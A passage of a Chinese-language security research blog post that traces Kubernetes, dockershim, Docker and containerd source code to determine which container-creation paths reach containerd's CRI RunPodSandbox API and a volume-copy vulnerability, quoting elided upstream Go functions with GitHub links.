<div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-go" data-lang="go"><span style="color:#66d9ef">func</span> (<span style="color:#a6e22e">kl</span> <span style="color:#f92672">*</span><span style="color:#a6e22e">Kubelet</span>) <span style="color:#a6e22e">syncPod</span>(<span style="color:#a6e22e">ctx</span> <span style="color:#a6e22e">context</span>.<span style="color:#a6e22e">Context</span>, <span style="color:#a6e22e">updateType</span> <span style="color:#a6e22e">kubetypes</span>.<span style="color:#a6e22e">SyncPodType</span>, <span style="color:#a6e22e">pod</span>, <span style="color:#a6e22e">mirrorPod</span> <span style="color:#f92672">*</span><span style="color:#a6e22e">v1</span>.<span style="color:#a6e22e">Pod</span>, <span style="color:#a6e22e">podStatus</span> <span style="color:#f92672">*</span><span style="color:#a6e22e">kubecontainer</span>.<span style="color:#a6e22e">PodStatus</span>) <span style="color:#66d9ef">error</span> {
    <span style="color:#f92672">...</span>
    <span style="color:#a6e22e">result</span> <span style="color:#f92672">:=</span> <span style="color:#a6e22e">kl</span>.<span style="color:#a6e22e">containerRuntime</span>.<span style="color:#a6e22e">SyncPod</span>(<span style="color:#a6e22e">pod</span>, <span style="color:#a6e22e">podStatus</span>, <span style="color:#a6e22e">pullSecrets</span>, <span style="color:#a6e22e">kl</span>.<span style="color:#a6e22e">backOff</span>)
    <span style="color:#f92672">...</span>
}
</code></pre></div><hr>
<p>如果需要创建容器，会调用<code>kubeGenericRuntimeManager.createPodSandbox</code>方法。</p>
<p><a href="https://github.com/kubernetes/kubernetes/blob/v1.23.4/pkg/kubelet/kuberuntime/kuberuntime_manager.go#L817">https://github.com/kubernetes/kubernetes/blob/v1.23.4/pkg/kubelet/kuberuntime/kuberuntime_manager.go#L817</a></p>
<div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-go" data-lang="go"><span style="color:#66d9ef">func</span> (<span style="color:#a6e22e">m</span> <span style="color:#f92672">*</span><span style="color:#a6e22e">kubeGenericRuntimeManager</span>) <span style="color:#a6e22e">SyncPod</span>(<span style="color:#a6e22e">pod</span> <span style="color:#f92672">*</span><span style="color:#a6e22e">v1</span>.<span style="color:#a6e22e">Pod</span>, <span style="color:#a6e22e">podStatus</span> <span style="color:#f92672">*</span><span style="color:#a6e22e">kubecontainer</span>.<span style="color:#a6e22e">PodStatus</span>, <span style="color:#a6e22e">pullSecrets</span> []<span style="color:#a6e22e">v1</span>.<span style="color:#a6e22e">Secret</span>, <span style="color:#a6e22e">backOff</span> <span style="color:#f92672">*</span><span style="color:#a6e22e">flowcontrol</span>.<span style="color:#a6e22e">Backoff</span>) (<span style="color:#a6e22e">result</span> <span style="color:#a6e22e">kubecontainer</span>.<span style="color:#a6e22e">PodSyncResult</span>) {
    <span style="color:#f92672">...</span>
    <span style="color:#a6e22e">podSandboxID</span>, <span style="color:#a6e22e">msg</span>, <span style="color:#a6e22e">err</span> = <span style="color:#a6e22e">m</span>.<span style="color:#a6e22e">createPodSandbox</span>(<span style="color:#a6e22e">pod</span>, <span style="color:#a6e22e">podContainerChanges</span>.<span style="color:#a6e22e">Attempt</span>)
    <span style="color:#f92672">...</span>
}
</code></pre></div><hr>
<p>该方法中创建了pod配置，然后调用<code>runtimeService.RunPodSandbox</code>方法。</p>
<p><a href="https://github.com/kubernetes/kubernetes/blob/v1.23.4/pkg/kubelet/kuberuntime/kuberuntime_sandbox.go#L67">https://github.com/kubernetes/kubernetes/blob/v1.23.4/pkg/kubelet/kuberuntime/kuberuntime_sandbox.go#L67</a></p>
<div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-go" data-lang="go"><span style="color:#66d9ef">func</span> (<span style="color:#a6e22e">m</span> <span style="color:#f92672">*</span><span style="color:#a6e22e">kubeGenericRuntimeManager</span>) <span style="color:#a6e22e">createPodSandbox</span>(<span style="color:#a6e22e">pod</span> <span style="color:#f92672">*</span><span style="color:#a6e22e">v1</span>.<span style="color:#a6e22e">Pod</span>, <span style="color:#a6e22e">attempt</span> <span style="color:#66d9ef">uint32</span>) (<span style="color:#66d9ef">string</span>, <span style="color:#66d9ef">string</span>, <span style="color:#66d9ef">error</span>) {
    <span style="color:#a6e22e">podSandboxConfig</span>, <span style="color:#a6e22e">err</span> <span style="color:#f92672">:=</span> <span style="color:#a6e22e">m</span>.<span style="color:#a6e22e">generatePodSandboxConfig</span>(<span style="color:#a6e22e">pod</span>, <span style="color:#a6e22e">attempt</span>)
    <span style="color:#f92672">...</span>
    <span style="color:#a6e22e">runtimeHandler</span> <span style="color:#f92672">:=</span> <span style="color:#e6db74">&#34;&#34;</span>
    <span style="color:#66d9ef">if</span> <span style="color:#a6e22e">m</span>.<span style="color:#a6e22e">runtimeClassManager</span> <span style="color:#f92672">!=</span> <span style="color:#66d9ef">nil</span> {
        <span style="color:#a6e22e">runtimeHandler</span>, <span style="color:#a6e22e">err</span> = <span style="color:#a6e22e">m</span>.<span style="color:#a6e22e">runtimeClassManager</span>.<span style="color:#a6e22e">LookupRuntimeHandler</span>(<span style="color:#a6e22e">pod</span>.<span style="color:#a6e22e">Spec</span>.<span style="color:#a6e22e">RuntimeClassName</span>)
        <span style="color:#f92672">...</span>
    }
    
    <span style="color:#a6e22e">podSandBoxID</span>, <span style="color:#a6e22e">err</span> <span style="color:#f92672">:=</span> <span style="color:#a6e22e">m</span>.<span style="color:#a6e22e">runtimeService</span>.<span style="color:#a6e22e">RunPodSandbox</span>(<span style="color:#a6e22e">podSandboxConfig</span>, <span style="color:#a6e22e">runtimeHandler</span>)
    <span style="color:#f92672">...</span>
}
</code></pre></div><hr>
<p><code>runtimeService</code>是一个gRPC的客户端，<code>RunPodSandbox</code>方法中会调用gRPC服务。</p>
<p><a href="https://github.com/kubernetes/kubernetes/blob/v1.23.4/pkg/kubelet/kuberuntime/instrumented_services.go#L185">https://github.com/kubernetes/kubernetes/blob/v1.23.4/pkg/kubelet/kuberuntime/instrumented_services.go#L185</a></p>
<div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-go" data-lang="go"><span style="color:#66d9ef">func</span> (<span style="color:#a6e22e">in</span> <span style="color:#a6e22e">instrumentedRuntimeService</span>) <span style="color:#a6e22e">RunPodSandbox</span>(<span style="color:#a6e22e">config</span> <span style="color:#f92672">*</span><span style="color:#a6e22e">runtimeapi</span>.<span style="color:#a6e22e">PodSandboxConfig</span>, <span style="color:#a6e22e">runtimeHandler</span> <span style="color:#66d9ef">string</span>) (<span style="color:#66d9ef">string</span>, <span style="color:#66d9ef">error</span>) {
    <span style="color:#f92672">...</span>
    <span style="color:#a6e22e">out</span>, <span style="color:#a6e22e">err</span> <span style="color:#f92672">:=</span> <span style="color:#a6e22e">in</span>.<span style="color:#a6e22e">service</span>.<span style="color:#a6e22e">RunPodSandbox</span>(<span style="color:#a6e22e">config</span>, <span style="color:#a6e22e">runtimeHandler</span>)
    <span style="color:#f92672">...</span>
}
</code></pre></div><hr>
<p>这里有两个版本的api，分别是v1, v1alpha2, 根据runtime支持的版本来调用对应的方法。</p>
<p><a href="https://github.com/kubernetes/kubernetes/blob/v1.23.4/pkg/kubelet/cri/remote/remote_runtime.go#L180">https://github.com/kubernetes/kubernetes/blob/v1.23.4/pkg/kubelet/cri/remote/remote_runtime.go#L180</a></p>
<div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-go" data-lang="go"><span style="color:#66d9ef">func</span> (<span style="color:#a6e22e">r</span> <span style="color:#f92672">*</span><span style="color:#a6e22e">remoteRuntimeService</span>) <span style="color:#a6e22e">RunPodSandbox</span>(<span style="color:#a6e22e">config</span> <span style="color:#f92672">*</span><span style="color:#a6e22e">runtimeapi</span>.<span style="color:#a6e22e">PodSandboxConfig</span>, <span style="color:#a6e22e">runtimeHandler</span> <span style="color:#66d9ef">string</span>) (<span style="color:#66d9ef">string</span>, <span style="color:#66d9ef">error</span>) {
    <span style="color:#f92672">...</span>
    <span style="color:#66d9ef">if</span> <span style="color:#a6e22e">r</span>.<span style="color:#a6e22e">useV1API</span>() {
        <span style="color:#a6e22e">resp</span>, <span style="color:#a6e22e">err</span> <span style="color:#f92672">:=</span> <span style="color:#a6e22e">r</span>.<span style="color:#a6e22e">runtimeClient</span>.<span style="color:#a6e22e">RunPodSandbox</span>(<span style="color:#a6e22e">ctx</span>, <span style="color:#f92672">&amp;</span><span style="color:#a6e22e">runtimeapi</span>.<span style="color:#a6e22e">RunPodSandboxRequest</span>{
            <span style="color:#a6e22e">Config</span>:         <span style="color:#a6e22e">config</span>,
            <span style="color:#a6e22e">RuntimeHandler</span>: <span style="color:#a6e22e">runtimeHandler</span>,
        })
        <span style="color:#f92672">...</span>
    } <span style="color:#66d9ef">else</span> {
        <span style="color:#a6e22e">resp</span>, <span style="color:#a6e22e">err</span> <span style="color:#f92672">:=</span> <span style="color:#a6e22e">r</span>.<span style="color:#a6e22e">runtimeClientV1alpha2</span>.<span style="color:#a6e22e">RunPodSandbox</span>(<span style="color:#a6e22e">ctx</span>, <span style="color:#f92672">&amp;</span><span style="color:#a6e22e">runtimeapiV1alpha2</span>.<span style="color:#a6e22e">RunPodSandboxRequest</span>{
            <span style="color:#a6e22e">Config</span>:         <span style="color:#a6e22e">v1alpha2PodSandboxConfig</span>(<span style="color:#a6e22e">config</span>),
            <span style="color:#a6e22e">RuntimeHandler</span>: <span style="color:#a6e22e">runtimeHandler</span>,
        })
        <span style="color:#f92672">...</span>
    }
    <span style="color:#f92672">...</span>
}
</code></pre></div><hr>
<p>即调用runtime的api <code>/runtime.v1.RuntimeService/RunPodSandbox</code>或<code>/runtime.v1alpha2.RuntimeService/RunPodSandbox</code>。至此确定k8s会调用containerd的api，分析完毕。</p>
<p><a href="https://github.com/kubernetes/kubernetes/blob/v1.23.4/staging/src/k8s.io/cri-api/pkg/apis/runtime/v1/api.pb.go#L8529">https://github.com/kubernetes/kubernetes/blob/v1.23.4/staging/src/k8s.io/cri-api/pkg/apis/runtime/v1/api.pb.go#L8529</a></p>
<div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-go" data-lang="go"><span style="color:#66d9ef">func</span> (<span style="color:#a6e22e">c</span> <span style="color:#f92672">*</span><span style="color:#a6e22e">runtimeServiceClient</span>) <span style="color:#a6e22e">RunPodSandbox</span>(<span style="color:#a6e22e">ctx</span> <span style="color:#a6e22e">context</span>.<span style="color:#a6e22e">Context</span>, <span style="color:#a6e22e">in</span> <span style="color:#f92672">*</span><span style="color:#a6e22e">RunPodSandboxRequest</span>, <span style="color:#a6e22e">opts</span> <span style="color:#f92672">...</span><span style="color:#a6e22e">grpc</span>.<span style="color:#a6e22e">CallOption</span>) (<span style="color:#f92672">*</span><span style="color:#a6e22e">RunPodSandboxResponse</span>, <span style="color:#66d9ef">error</span>) {
    <span style="color:#f92672">...</span>
    <span style="color:#a6e22e">err</span> <span style="color:#f92672">:=</span> <span style="color:#a6e22e">c</span>.<span style="color:#a6e22e">cc</span>.<span style="color:#a6e22e">Invoke</span>(<span style="color:#a6e22e">ctx</span>, <span style="color:#e6db74">&#34;/runtime.v1.RuntimeService/RunPodSandbox&#34;</span>, <span style="color:#a6e22e">in</span>, <span style="color:#a6e22e">out</span>, <span style="color:#a6e22e">opts</span><span style="color:#f92672">...</span>)
    <span style="color:#f92672">...</span>
}
</code></pre></div><p><a href="https://github.com/kubernetes/kubernetes/blob/v1.23.4/staging/src/k8s.io/cri-api/pkg/apis/runtime/v1alpha2/api.pb.go#L8539">https://github.com/kubernetes/kubernetes/blob/v1.23.4/staging/src/k8s.io/cri-api/pkg/apis/runtime/v1alpha2/api.pb.go#L8539</a></p>
<div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-go" data-lang="go"><span style="color:#66d9ef">func</span> (<span style="color:#a6e22e">c</span> <span style="color:#f92672">*</span><span style="color:#a6e22e">runtimeServiceClient</span>) <span style="color:#a6e22e">RunPodSandbox</span>(<span style="color:#a6e22e">ctx</span> <span style="color:#a6e22e">context</span>.<span style="color:#a6e22e">Context</span>, <span style="color:#a6e22e">in</span> <span style="color:#f92672">*</span><span style="color:#a6e22e">RunPodSandboxRequest</span>, <span style="color:#a6e22e">opts</span> <span style="color:#f92672">...</span><span style="color:#a6e22e">grpc</span>.<span style="color:#a6e22e">CallOption</span>) (<span style="color:#f92672">*</span><span style="color:#a6e22e">RunPodSandboxResponse</span>, <span style="color:#66d9ef">error</span>) {
    <span style="color:#f92672">...</span>
    <span style="color:#a6e22e">err</span> <span style="color:#f92672">:=</span> <span style="color:#a6e22e">c</span>.<span style="color:#a6e22e">cc</span>.<span style="color:#a6e22e">Invoke</span>(<span style="color:#a6e22e">ctx</span>, <span style="color:#e6db74">&#34;/runtime.v1alpha2.RuntimeService/RunPodSandbox&#34;</span>, <span style="color:#a6e22e">in</span>, <span style="color:#a6e22e">out</span>, <span style="color:#a6e22e">opts</span><span style="color:#f92672">...</span>)
    <span style="color:#f92672">...</span>
}
</code></pre></div><hr>
<h4 id="32-k8sdockercontainerd">3.2 k8s+docker+containerd</h4>
<p>低版本k8s(即使用了dockershim的版本,本文编写时k8s尚未完成dockershim移除工作)不涉及此漏洞，分析过程如下：</p>
<p>根据上文分析，k8s创建容器会调用runtime的api <code>/runtime.v1.RuntimeService/RunPodSandbox</code>或<code>/runtime.v1alpha2.RuntimeService/RunPodSandbox</code>。</p>
<p>如果runtime为dockershim，应该也注册了api。经分析，dockershim确实注册v1aplha2 api。</p>
<p><a href="https://github.com/kubernetes/kubernetes/blob/v1.23.4/pkg/kubelet/dockershim/remote/docker_server.go#L73">https://github.com/kubernetes/kubernetes/blob/v1.23.4/pkg/kubelet/dockershim/remote/docker_server.go#L73</a></p>
<div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-go" data-lang="go"><span style="color:#66d9ef">func</span> (<span style="color:#a6e22e">s</span> <span style="color:#f92672">*</span><span style="color:#a6e22e">DockerServer</span>) <span style="color:#a6e22e">Start</span>() <span style="color:#66d9ef">error</span> {
    <span style="color:#f92672">...</span>
    <span style="color:#a6e22e">runtimeapi</span>.<span style="color:#a6e22e">RegisterRuntimeServiceServer</span>(<span style="color:#a6e22e">s</span>.<span style="color:#a6e22e">server</span>, <span style="color:#a6e22e">s</span>.<span style="color:#a6e22e">service</span>)
    <span style="color:#f92672">...</span>
    <span style="color:#66d9ef">return</span> <span style="color:#66d9ef">nil</span>
}
</code></pre></div><p><a href="https://github.com/kubernetes/kubernetes/blob/v1.23.4/staging/src/k8s.io/cri-api/pkg/apis/runtime/v1alpha2/api.pb.go#L8899">https://github.com/kubernetes/kubernetes/blob/v1.23.4/staging/src/k8s.io/cri-api/pkg/apis/runtime/v1alpha2/api.pb.go#L8899</a></p>
<div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-go" data-lang="go"><span style="color:#66d9ef">func</span> <span style="color:#a6e22e">RegisterRuntimeServiceServer</span>(<span style="color:#a6e22e">s</span> <span style="color:#f92672">*</span><span style="color:#a6e22e">grpc</span>.<span style="color:#a6e22e">Server</span>, <span style="color:#a6e22e">srv</span> <span style="color:#a6e22e">RuntimeServiceServer</span>) {
    <span style="color:#a6e22e">s</span>.<span style="color:#a6e22e">RegisterService</span>(<span style="color:#f92672">&amp;</span><span style="color:#a6e22e">_RuntimeService_serviceDesc</span>, <span style="color:#a6e22e">srv</span>)
}
</code></pre></div><p><a href="https://github.com/kubernetes/kubernetes/blob/v1.23.4/staging/src/k8s.io/cri-api/pkg/apis/runtime/v1alpha2/api.pb.go#L9345">https://github.com/kubernetes/kubernetes/blob/v1.23.4/staging/src/k8s.io/cri-api/pkg/apis/runtime/v1alpha2/api.pb.go#L9345</a></p>
<div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-go" data-lang="go"><span style="color:#66d9ef">var</span> <span style="color:#a6e22e">_RuntimeService_serviceDesc</span> = <span style="color:#a6e22e">grpc</span>.<span style="color:#a6e22e">ServiceDesc</span>{
    <span style="color:#a6e22e">ServiceName</span>: <span style="color:#e6db74">&#34;runtime.v1alpha2.RuntimeService&#34;</span>,
    <span style="color:#f92672">...</span>
    <span style="color:#a6e22e">Methods</span>: []<span style="color:#a6e22e">grpc</span>.<span style="color:#a6e22e">MethodDesc</span>{
        <span style="color:#f92672">...</span>
        {
            <span style="color:#a6e22e">MethodName</span>: <span style="color:#e6db74">&#34;RunPodSandbox&#34;</span>,
            <span style="color:#a6e22e">Handler</span>:    <span style="color:#a6e22e">_RuntimeService_RunPodSandbox_Handler</span>,
        },
    },
	<span style="color:#f92672">...</span>
}
</code></pre></div><hr>
<p>因此, k8s+docker未调用containerd的api。至于dockershim提供的api是否有类似问题，则需要分析dockershim对该api的实现。分析调用链发现，dockershim实际调用了dockerd的api，这个调用与下文docker+containerd场景一致，详细内容可以参见下文关于&quot;docker+containerd&quot;场景的分析。</p>
<p><a href="https://github.com/kubernetes/kubernetes/blob/v1.23.4/pkg/kubelet/dockershim/docker_sandbox.go#L115">https://github.com/kubernetes/kubernetes/blob/v1.23.4/pkg/kubelet/dockershim/docker_sandbox.go#L115</a></p>
<div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-go" data-lang="go"><span style="color:#66d9ef">func</span> (<span style="color:#a6e22e">ds</span> <span style="color:#f92672">*</span><span style="color:#a6e22e">dockerService</span>) <span style="color:#a6e22e">RunPodSandbox</span>(<span style="color:#a6e22e">ctx</span> <span style="color:#a6e22e">context</span>.<span style="color:#a6e22e">Context</span>, <span style="color:#a6e22e">r</span> <span style="color:#f92672">*</span><span style="color:#a6e22e">runtimeapi</span>.<span style="color:#a6e22e">RunPodSandboxRequest</span>) (<span style="color:#f92672">*</span><span style="color:#a6e22e">runtimeapi</span>.<span style="color:#a6e22e">RunPodSandboxResponse</span>, <span style="color:#66d9ef">error</span>) {
    <span style="color:#f92672">...</span>
    <span style="color:#a6e22e">createResp</span>, <span style="color:#a6e22e">err</span> <span style="color:#f92672">:=</span> <span style="color:#a6e22e">ds</span>.<span style="color:#a6e22e">client</span>.<span style="color:#a6e22e">CreateContainer</span>(<span style="color:#f92672">*</span><span style="color:#a6e22e">createConfig</span>)
    <span style="color:#f92672">...</span>
}
</code></pre></div><p><a href="https://github.com/kubernetes/kubernetes/blob/v1.23.4/pkg/kubelet/dockershim/libdocker/kube_docker_client.go#L149">https://github.com/kubernetes/kubernetes/blob/v1.23.4/pkg/kubelet/dockershim/libdocker/kube_docker_client.go#L149</a></p>
<div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-go" data-lang="go"><span style="color:#66d9ef">func</span> (<span style="color:#a6e22e">d</span> <span style="color:#f92672">*</span><span style="color:#a6e22e">kubeDockerClient</span>) <span style="color:#a6e22e">CreateContainer</span>(<span style="color:#a6e22e">opts</span> <span style="color:#a6e22e">dockertypes</span>.<span style="color:#a6e22e">ContainerCreateConfig</span>) (<span style="color:#f92672">*</span><span style="color:#a6e22e">dockercontainer</span>.<span style="color:#a6e22e">ContainerCreateCreatedBody</span>, <span style="color:#66d9ef">error</span>) {
	<span style="color:#f92672">...</span>
	<span style="color:#a6e22e">createResp</span>, <span style="color:#a6e22e">err</span> <span style="color:#f92672">:=</span> <span style="color:#a6e22e">d</span>.<span style="color:#a6e22e">client</span>.<span style="color:#a6e22e">ContainerCreate</span>(<span style="color:#a6e22e">ctx</span>, <span style="color:#a6e22e">opts</span>.<span style="color:#a6e22e">Config</span>, <span style="color:#a6e22e">opts</span>.<span style="color:#a6e22e">HostConfig</span>, <span style="color:#a6e22e">opts</span>.<span style="color:#a6e22e">NetworkingConfig</span>, <span style="color:#66d9ef">nil</span>, <span style="color:#a6e22e">opts</span>.<span style="color:#a6e22e">Name</span>)
	<span style="color:#f92672">...</span>
}
</code></pre></div><p><a href="https://github.com/kubernetes/kubernetes/blob/v1.23.4/vendor/github.com/docker/docker/client/container_create.go#L24">https://github.com/kubernetes/kubernetes/blob/v1.23.4/vendor/github.com/docker/docker/client/container_create.go#L24</a></p>
<div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-go" data-lang="go"><span style="color:#66d9ef">func</span> (<span style="color:#a6e22e">cli</span> <span style="color:#f92672">*</span><span style="color:#a6e22e">Client</span>) <span style="color:#a6e22e">ContainerCreate</span>(<span style="color:#a6e22e">ctx</span> <span style="color:#a6e22e">context</span>.<span style="color:#a6e22e">Context</span>, <span style="color:#a6e22e">config</span> <span style="color:#f92672">*</span><span style="color:#a6e22e">container</span>.<span style="color:#a6e22e">Config</span>, <span style="color:#a6e22e">hostConfig</span> <span style="color:#f92672">*</span><span style="color:#a6e22e">container</span>.<span style="color:#a6e22e">HostConfig</span>, <span style="color:#a6e22e">networkingConfig</span> <span style="color:#f92672">*</span><span style="color:#a6e22e">network</span>.<span style="color:#a6e22e">NetworkingConfig</span>, <span style="color:#a6e22e">platform</span> <span style="color:#f92672">*</span><span style="color:#a6e22e">specs</span>.<span style="color:#a6e22e">Platform</span>, <span style="color:#a6e22e">containerName</span> <span style="color:#66d9ef">string</span>) (<span style="color:#a6e22e">container</span>.<span style="color:#a6e22e">ContainerCreateCreatedBody</span>, <span style="color:#66d9ef">error</span>) {
    <span style="color:#f92672">...</span>
}
</code></pre></div><hr>
<h4 id="33-dockercontainerd">3.3 docker+containerd</h4>
<p>docker container create 或 docker run 会触发容器创建流程，根据分析，该流程不会调用到containerd。</p>
<p>详细流程参见 <a href="https://ssst0n3.github.io/post/%E7%BD%91%E7%BB%9C%E5%AE%89%E5%85%A8/%E5%AE%89%E5%85%A8%E7%A0%94%E7%A9%B6/%E5%AE%B9%E5%99%A8%E5%AE%89%E5%85%A8/%E8%BF%9B%E7%A8%8B%E5%AE%B9%E5%99%A8/%E6%9C%8D%E5%8A%A1%E5%99%A8%E5%AE%B9%E5%99%A8/docker/docker%E6%BA%90%E7%A0%81%E5%AE%A1%E8%AE%A1/docker%E6%BA%90%E7%A0%81%E5%88%86%E6%9E%90/docker-container/docker-container-create-%E6%B5%81%E7%A8%8B-%E6%BA%90%E7%A0%81%E5%88%86%E6%9E%90.html">《docker container create 流程 源码分析》</a>。</p>
<p>docker在创建容器时，也会从容器文件系统中复制文件到卷，但docker在复制时，容器文件系统的路径即源路径，解析了软链接，并限制在容器rootfs内。因此不存在与此漏洞相同机制的漏洞。</p>
<p><a href="https://github.com/moby/moby/blob/master/container/container_unix.go#L129">https://github.com/moby/moby/blob/master/container/container_unix.go#L129</a></p>
<div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-go" data-lang="go"><span style="color:#66d9ef">func</span> (<span style="color:#a6e22e">container</span> <span style="color:#f92672">*</span><span style="color:#a6e22e">Container</span>) <span style="color:#a6e22e">CopyImagePathContent</span>(<span style="color:#a6e22e">v</span> <span style="color:#a6e22e">volume</span>.<span style="color:#a6e22e">Volume</span>, <span style="color:#a6e22e">destination</span> <span style="color:#66d9ef">string</span>) <span style="color:#66d9ef">error</span> {
    <span style="color:#a6e22e">rootfs</span>, <span style="color:#a6e22e">err</span> <span style="color:#f92672">:=</span> <span style="color:#a6e22e">container</span>.<span style="color:#a6e22e">GetResourcePath</span>(<span style="color:#a6e22e">destination</span>)
    <span style="color:#66d9ef">if</span> <span style="color:#a6e22e">err</span> <span style="color:#f92672">!=</span> <span style="color:#66d9ef">nil</span> {
        <span style="color:#66d9ef">return</span> <span style="color:#a6e22e">err</span>
    }
    <span style="color:#f92672">...</span>
    <span style="color:#a6e22e">id</span> <span style="color:#f92672">:=</span> <span style="color:#a6e22e">stringid</span>.<span style="color:#a6e22e">GenerateRandomID</span>()
    <span style="color:#a6e22e">path</span>, <span style="color:#a6e22e">err</span> <span style="color:#f92672">:=</span> <span style="color:#a6e22e">v</span>.<span style="color:#a6e22e">Mount</span>(<span style="color:#a6e22e">id</span>)
    <span style="color:#66d9ef">if</span> <span style="color:#a6e22e">err</span> <span style="color:#f92672">!=</span> <span style="color:#66d9ef">nil</span> {
        <span style="color:#66d9ef">return</span> <span style="color:#a6e22e">err</span>
    }

    <span style="color:#66d9ef">defer</span> <span style="color:#66d9ef">func</span>() {
        <span style="color:#66d9ef">if</span> <span style="color:#a6e22e">err</span> <span style="color:#f92672">:=</span> <span style="color:#a6e22e">v</span>.<span style="color:#a6e22e">Unmount</span>(<span style="color:#a6e22e">id</span>); <span style="color:#a6e22e">err</span> <span style="color:#f92672">!=</span> <span style="color:#66d9ef">nil</span> {
            <span style="color:#a6e22e">logrus</span>.<span style="color:#a6e22e">Warnf</span>(<span style="color:#e6db74">&#34;error while unmounting volume %s: %v&#34;</span>, <span style="color:#a6e22e">v</span>.<span style="color:#a6e22e">Name</span>(), <span style="color:#a6e22e">err</span>)
        }
    }()
    <span style="color:#f92672">...</span>
    <span style="color:#66d9ef">return</span> <span style="color:#a6e22e">copyExistingContents</span>(<span style="color:#a6e22e">rootfs</span>, <span style="color:#a6e22e">path</span>)
}
</code></pre></div><h4 id="34-ctrcontaienrd">3.4 ctr+contaienrd</h4>
<p>ctr是containerd的cli，可以使用<code>ctr container create &lt;ImageName&gt; &lt;ContainerID&gt;</code>等命令创建容器。根据分析，该方式创建的容器不会调用criService。</p>
<p>分析过程如下，关于更详细的ctr创建容器流程参见<a href="https://ssst0n3.github.io/post/%E7%BD%91%E7%BB%9C%E5%AE%89%E5%85%A8/%E5%AE%89%E5%85%A8%E7%A0%94%E7%A9%B6/%E5%AE%B9%E5%99%A8%E5%AE%89%E5%85%A8/%E8%BF%9B%E7%A8%8B%E5%AE%B9%E5%99%A8/%E6%9C%8D%E5%8A%A1%E5%99%A8%E5%AE%B9%E5%99%A8/containerd/%E6%BA%90%E7%A0%81%E5%88%86%E6%9E%90/ctr-container-create-%E6%B5%81%E7%A8%8B.html">《ctr container create 流程》</a>。</p>
<p>从<code>cmd/ctr/commands/containers</code>目录找到<code>createCommand</code>, 一直跟踪下去，都是在处理参数和调用新的Create函数。</p>
<p><a href="https://github.com/containerd/containerd/blob/v1.6.0/cmd/ctr/commands/containers/containers.go#L85">https://github.com/containerd/containerd/blob/v1.6.0/cmd/ctr/commands/containers/containers.go#L85</a></p>
<div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-go" data-lang="go"><span style="color:#66d9ef">var</span> <span style="color:#a6e22e">createCommand</span> = <span style="color:#a6e22e">cli</span>.<span style="color:#a6e22e">Command</span>{
    <span style="color:#f92672">...</span>
    <span style="color:#a6e22e">Action</span>: <span style="color:#66d9ef">func</span>(<span style="color:#a6e22e">context</span> <span style="color:#f92672">*</span><span style="color:#a6e22e">cli</span>.<span style="color:#a6e22e">Context</span>) <span style="color:#66d9ef">error</span> {
        <span style="color:#f92672">...</span>
        <span style="color:#a6e22e">_</span>, <span style="color:#a6e22e">err</span> = <span style="color:#a6e22e">run</span>.<span style="color:#a6e22e">NewContainer</span>(<span style="color:#a6e22e">ctx</span>, <span style="color:#a6e22e">client</span>, <span style="color:#a6e22e">context</span>)
        <span style="color:#f92672">...</span>
    },
}
</code></pre></div><p><a href="https://github.com/containerd/containerd/blob/v1.6.0/cmd/ctr/commands/run/run_unix.go#L347">https://github.com/containerd/containerd/blob/v1.6.0/cmd/ctr/commands/run/run_unix.go#L347</a></p>
<div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-go" data-lang="go"><span style="color:#66d9ef">func</span> <span style="color:#a6e22e">NewContainer</span>(<span style="color:#a6e22e">ctx</span> <span style="color:#a6e22e">gocontext</span>.<span style="color:#a6e22e">Context</span>, <span style="color:#a6e22e">client</span> <span style="color:#f92672">*</span><span style="color:#a6e22e">containerd</span>.<span style="color:#a6e22e">Client</span>, <span style="color:#a6e22e">context</span> <span style="color:#f92672">*</span><span style="color:#a6e22e">cli</span>.<span style="color:#a6e22e">Context</span>) (<span style="color:#a6e22e">containerd</span>.<span style="color:#a6e22e">Container</span>, <span style="color:#66d9ef">error</span>) {
    <span style="color:#f92672">...</span>
    <span style="color:#66d9ef">return</span> <span style="color:#a6e22e">client</span>.<span style="color:#a6e22e">NewContainer</span>(<span style="color:#a6e22e">ctx</span>, <span style="color:#a6e22e">id</span>, <span style="color:#a6e22e">cOpts</span><span style="color:#f92672">...</span>)
}
</code></pre></div><p><a href="https://github.com/containerd/containerd/blob/v1.6.0/client.go#L289">https://github.com/containerd/containerd/blob/v1.6.0/client.go#L289</a></p>
